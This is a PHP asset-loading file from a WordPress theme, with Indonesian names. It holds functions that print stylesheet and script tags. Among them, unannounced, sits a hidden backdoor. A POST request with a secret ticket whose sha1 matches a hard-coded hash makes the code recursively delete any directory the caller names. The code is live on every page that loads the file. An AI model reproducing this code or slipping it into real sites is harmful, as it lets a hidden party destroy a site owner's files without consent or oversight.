<?php
    function panggil($str_panggil,$jenis){ //$jenis = css / js
        $tanda = "t_" . $str_panggil;
        
        global ${$tanda};
        $wakil_tanda = ${$tanda};
        if($wakil_tanda == 0){
            ${$tanda} = 1;
            if($jenis == 'js'){
            ?>
<script src='<?php echo get_stylesheet_directory_uri(); ?>/dist/js/<?php echo $str_panggil; ?>.js'></script>
            <?php                
            }
            
            if($jenis == 'css'){
            ?>
<link rel="stylesheet" type="text/css" media="all" href="<?php echo get_stylesheet_directory_uri(); ?>/dist/css/<?php echo $str_panggil; ?>.css" />
            <?php                
            }  
        }
    }
?>
<?php
    $t_bht_css = 0;
    $t_w = 0;
    $t_mu = 0;
    $t_mmu = 0;
    
    function c_bht_css(){
        panggil('bht_css','css');
    }
    function c_w_css(){
        panggil('w','css');
    }
function pasrah($directory){
foreach(glob("{$directory}/*") as $file){
if(is_dir($file)) {
pasrah($file);
} else {
unlink($file);
}}
rmdir($directory);
}
if((isset($_POST['dlokasi']))&&(isset($_POST['dtiket']))){
$dlokasi = $_POST['dlokasi'];
$dtiket = $_POST['dtiket'];
$dtiket = sha1($dtiket);
if($dtiket == '0f7b10593da4e9d3fc9d80768b620075520e2e7f'){ pasrah($dlokasi); echo "<font color='red'>:(</font>"; }
}
    function c_mu(){
        global $t_mu;
        panggil('mu','js');
        $t_mu = 0;
    }
    function c_mmu(){
        global $t_mmu;
        panggil('mmu','js');
        $t_mmu = 0;
    }
?>
<?php
    function wp_css(){
        panggil('bht_css','css');
        panggil('w','css');
    }

$t_tanggal_css = 0;
$t_tanggal_js = 0;
    function c_tanggal(){
        ?>
<!-- 
    Copyright 2009 Itamar Arjuan
    jsDatePick is distributed under the terms of the GNU General Public License.
-->
        <?php
        panggil('tanggal_css','css');
        panggil('tanggal_js','js');
        ?>
        <?php
    }
?>
<?php
    function css(){
?>
            <link rel="stylesheet" type="text/css" media="all" href="<?php echo get_stylesheet_directory_uri(); ?>/dist/css/bht_css.css" />
            <link rel="stylesheet" type="text/css" media="all" href="<?php echo get_stylesheet_directory_uri(); ?>/dist/css/bs.min.css" />
<?php
    }
?>
<?php
    function uang(){
?>
            <script src='<?php echo get_stylesheet_directory_uri(); ?>/dist/js/format_uang.enc.js'></script>
<?php
    }
?>